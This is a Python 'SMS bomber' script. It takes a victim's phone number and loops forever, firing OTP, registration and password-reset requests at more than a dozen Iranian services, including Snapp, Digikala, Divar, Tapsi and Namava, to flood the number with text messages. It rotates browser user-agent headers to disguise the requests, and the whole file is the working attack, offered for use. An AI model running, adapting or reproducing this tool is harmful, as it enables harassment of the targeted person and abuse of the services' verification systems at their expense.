import time
import requests 
#SmsBomber_Erfan_Tavana
import random
from colorama import Fore as color  
import os
from rich import pretty
pretty.install()
from rich. prompt import Prompt
from rich. console import Console
console = Console()
from time import sleep
import winsound



heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
print("")
number = input(color.GREEN+" Entrez votre nombre cible : "+color.MAGENTA+"( 9057767099 )  ")
if number.index("0") == 0 :
    while number.index("0") == 0 :     
        print(color.RED+"It should not have zero")
        number = input(color.GREEN+" Entrez votre nombre cible : "+color.MAGENTA+"( 9057767099 )  ")

numb = 0
os.system("cls")
while True :
    
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :
    

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
        
    #دکتر دکتر 
    

    doktor_number = {"phoneNumber":number,"userType":"PATIENT"}
    doktor = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
    req_doktor = requests.post(doktor,json=doktor_number,headers=rhead)
    if req_doktor.status_code == 200:
        time.sleep(2)
        numb += 1
        print(color.GREEN+"DoktorDoktor---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"DoktorDoktor--- NOT ---SENT",color.GREEN+f"{numb}")

    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    #SmsBomber_Erfan_Tavana
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    #دیجی کالا
    rhead = random.choice(heads)
    digi_number = {"backUrl":"/","username":number,"otp_call":"false"}
    digi = "https://api.digikala.com/v1/user/authenticate/"
    req_digi = requests.post(digi,json=digi_number,headers=rhead)
    #SmsBomber_Erfan_Tavana
    if req_digi.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Digikala---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Digikala--- NOT ---SENT",color.GREEN+f"{numb}")

    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    #SmsBomber_Erfan_Tavana
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    #namava
    rhead = random.choice(heads)
    namava_number = {"UserName":f"+98{number}"}
    namava = "https://www.namava.ir/api/v1.0/accounts/reset-passwords/by-phone/request"
    req_namava = requests.post(namava,json=namava_number,headers=rhead)
    if req_namava.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Namava---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Namava--- NOT ---SENT",color.GREEN+f"{numb}")
    #snap
    # عرفان توانا
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    # دیوار 
    divar_number = {"phone": f"0{number}"}
    divar = "https://api.divar.ir/v5/auth/authenticate"
    req_divar = requests.post(divar,json=divar_number,headers=rhead)
    if req_divar.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Divar---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Divar--- NOT ---SENT",color.GREEN+f"{numb}")
    #lenz 
    lenz_number = {"msisdn":f"98{number}"}
    lenz = "https://api-v3.lenz.ir/api/v3/user-management/otp/register"
    rhead = random.choice(heads)
    req_lenz = requests.post(lenz,json=lenz_number,headers=rhead)
    if req_lenz.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Lenz---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Lenz--- NOT ---SENT",color.GREEN+f"{numb}")
    #aio
    aio_number = {"mobile":f"0{number}"}
    aio = "https://api.aionet.ir/v4/auth/otp"
    rhead = random.choice(heads)
    req_aio = requests.post(aio,json=aio_number,headers=rhead)
    if req_aio.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Aio---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Aio--- NOT ---SENT",color.GREEN+f"{numb}")
    #mambaik
    mam_number = {"mobile":f"0{number}","confirmKey":"","password":"","password_repeat":""}
    mam = "https://mymoodic.com/ac/v1/account/send-verification"
    rhead = random.choice(heads)
    req_mam = requests.post(mam,json=mam_number,headers=rhead)
    if req_mam.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Mamdik---SENT",color.RED+f"{numb}")
    else :
        print(color.RED+"Mamdik--- NOT ---SENT",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    #tapsi
    tapsi_number = {"credential":{"phoneNumber":f"0{number}","role":"PASSENGER"},"otpOption":"SMS"}
    tapsi = "https://api.tapsi.cab/api/v2.2/user"
    rhead = random.choice(heads)
    req_tapsi = requests.post(tapsi,json=tapsi_number,headers=rhead)
    if req_tapsi.status_code == 200 :
        time.sleep(2)

        numb += 1
        print(color.GREEN+"Tapsi---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Tapsi--- NOT ---SENT",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    #دکتر تو 
    doktorto_number = {"mobile":number,"country_id":205}
    doktorto = "https://api.doctoreto.com/api/web/patient/v1/accounts/register"
    rhead = random.choice(heads)
    req_doktorto = requests.post(doktorto,json=doktorto_number,headers=rhead)
    if req_doktorto.status_code == 200 : 
        time.sleep(2)
        numb += 1
        print(color.GREEN+"Doktorto---SENT",color.RED+f"{numb}")
    else : 
        print(color.RED+"Doktorto--- NOT ---SENT",color.GREEN+f"{numb}")
    #
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    #تلوبیون
    telewebion_number = {"code":"98","phone":number,"smsStatus":"default"}
    telewebion = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one?isForeign=true"
    rhead = random.choice(heads)
    req_telewebion = requests.post(telewebion,json=telewebion_number,headers=rhead)
    if req_telewebion.status_code == 200 : 
        time.sleep(2)
        numb += 1
        print(color.GREEN+"Telewebion---SENT",color.RED+f"{numb}")
    else : 
        print(color.RED+"Telewebion--- NOT ---SENT",color.GREEN+f"{numb}")
    #snap
    snap_number = {"cellphone":f"+98{number}"}
    snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    rhead = random.choice(heads)
    req_snap = requests.post(snap,json=snap_number,headers=rhead)
    if req_snap.status_code == 200 :

        time.sleep(2)


        numb += 1
        print(color.GREEN+"Snap---SENT",color.RED+f"{numb}")
    else:
        winsound.PlaySound("beep.wav", winsound.SND_FILENAME)
        print(color.RED+"Snap--- NOT ---SENT",color.GREEN+f"{numb}")
    
    #slip 
    rund = 0
    rund += 1
    print(f"finish rund {rund}")
    winsound.Beep(500, 500)
    time.sleep(30)
